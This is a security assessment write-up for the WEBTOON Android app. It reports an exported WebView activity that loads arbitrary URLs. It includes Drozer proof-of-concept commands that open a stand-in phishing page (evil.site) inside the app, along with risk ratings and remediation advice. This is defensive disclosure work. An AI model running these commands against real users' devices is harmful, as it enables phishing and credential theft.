# üì± Android APK Vulnerability Assessment ‚Äì WEBTOON App

## üîç Overview

This project documents a critical WebView vulnerability identified in the official **WEBTOON Android app** (v3.6.9). The vulnerability allows malicious external URLs to be loaded inside the app‚Äôs internal WebView due to an **exported activity**. This behavior can be exploited for phishing or UI spoofing attacks.

- **APK Name**: `com.naver.linewebtoon.apk`
- **Version**: 3.6.9
- **Platform**: Android (Samsung S25 Ultra)
- **Test Date**: June 9, 2025
- **Tested By**: Eliza Delgado

---

## üõ†Ô∏è Tools & Environment

| Tool        | Purpose                     |
|-------------|-----------------------------|
| **Android Studio** | Static analysis of `AndroidManifest.xml` |
| **Drozer**         | Dynamic component exploitation |
| **ADB (Wireless)** | Command execution and APK install |
| **Samsung S25 Ultra** | Physical testing device |
| **Kali Linux (VM)** | Pentesting environment |

---

## ‚öôÔ∏è Static Analysis

The following **dangerous permission** was found in the manifest:

```xml
<uses-permission android:name="android.permission.READ_PHONE_STATE" android:maxSdkVersion="30" />
üìå This permission can expose the device IMEI, SIM state, or call status on Android versions ‚â§ SDK 30.

üö® Vulnerability Summary


The activity WebViewerActivity was marked as exported and accepted arbitrary URLs via intent extras.
‚ñ∂Ô∏è Drozer Proof-of-Concept:

run app.activity.start --component com.naver.linewebtoon com.naver.linewebtoon.common.web.WebViewerActivity --extra string url http://evil.site/webtoon-login

üì± Observed Behavior:

    The malicious link was opened inside the app‚Äôs WebView

    Could lead to phishing, UI spoofing, or session hijacking

‚ö†Ô∏è Risk Assessment
Category	Rating
Severity	HIGH
Likelihood	MEDIUM-HIGH
Impact	Credential Theft, Brand Damage
Exploit Vector	External apps, malicious intent broadcasts

‚úÖ Recommendations

  1. Restrict component exposure:

    android:exported="false"

  2. Implement intent validation:

       - Whitelist allowed domains

       - Reject malformed or external URLs

   3. Render unknown URLs externally:

       - Use Intent.ACTION_VIEW to delegate to a trusted browser

   4. Limit dangerous permissions:

       - Remove READ_PHONE_STATE unless strictly necessary

Appendix ‚Äì Drozer Commands Used

run app.package.info -a com.naver.linewebtoon
run app.activity.info -a com.naver.linewebtoon
run app.activity.start --component com.naver.linewebtoon com.naver.linewebtoon.common.web.WebViewerActivity
run app.activity.start --component com.naver.linewebtoon com.naver.linewebtoon.common.web.WebViewerActivity --extra string url http://example.com
run app.activity.start --component com.naver.linewebtoon com.naver.linewebtoon.common.web.WebViewerActivity --extra string url http://evil.site/webtoon-login




